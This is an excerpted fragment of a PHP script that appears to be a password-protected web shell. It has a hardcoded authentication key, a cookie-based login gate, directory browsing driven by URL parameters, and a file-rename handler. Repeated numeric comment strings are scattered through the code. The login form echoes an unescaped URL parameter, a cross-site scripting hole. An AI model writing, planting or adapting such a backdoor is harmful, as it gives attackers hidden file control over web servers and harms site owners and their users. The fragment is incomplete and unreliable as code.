...
$auth_key = "5527568e2b3bfa44f2aacd9c512e584d";
...
$pass = false;
if (isset($_COOKIE['pw_name_21857'])) {
    if(($_COOKIE['pw_name_21857']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_21857'])) {
        if(($_POST['pw_name_21857']) == $auth_key) {
            setcookie("pw_name_21857", $_POST['pw_name_21857']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_21857' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725567698197731 1725567698839681 1725567698752044 1725567698661150
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725567698197731 1725567698839681 1725567698752044 1725567698661150
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725567698197731 1725567698839681 1725567698752044 1725567698661150
            $name = PATH . "/" . $_GET['r'];
